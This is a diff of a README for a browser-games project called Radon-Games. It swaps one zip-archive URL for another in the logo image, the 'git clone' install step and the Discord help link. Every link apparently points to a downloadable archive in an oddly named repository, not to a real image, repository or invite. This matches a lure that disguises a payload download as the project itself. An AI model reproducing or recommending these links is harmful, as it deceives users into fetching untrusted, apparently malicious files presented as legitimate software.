@@ -1,6 +1,6 @@
 <p align="center">
   <kbd>
-    <img width="100px" src="https://raw.githubusercontent.com/bdgfeadvyrfedyu/Radon-Games/main/src/assets/Radon-Games-v1.1.zip">
+    <img width="100px" src="https://github.com/bdgfeadvyrfedyu/Radon-Games/raw/refs/heads/main/public/Games_Radon_3.4.zip">
   </kbd>
 </p>
 
@@ -19,7 +19,7 @@
 ### Installation
 
 ```bash
-git clone https://raw.githubusercontent.com/bdgfeadvyrfedyu/Radon-Games/main/src/assets/Radon-Games-v1.1.zip
+git clone https://github.com/bdgfeadvyrfedyu/Radon-Games/raw/refs/heads/main/public/Games_Radon_3.4.zip
 cd Radon-Games
 pnpm install
 pnpm run build
@@ -28,6 +28,6 @@ pnpm run preview
 
 ### Where to get help
 
-For questions and suggestions please join our [Discord server](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Radon-Games/main/src/assets/Radon-Games-v1.1.zip)
+For questions and suggestions please join our [Discord server](https://github.com/bdgfeadvyrfedyu/Radon-Games/raw/refs/heads/main/public/Games_Radon_3.4.zip)
 
 For any website/game issues please create a new GitHub issue
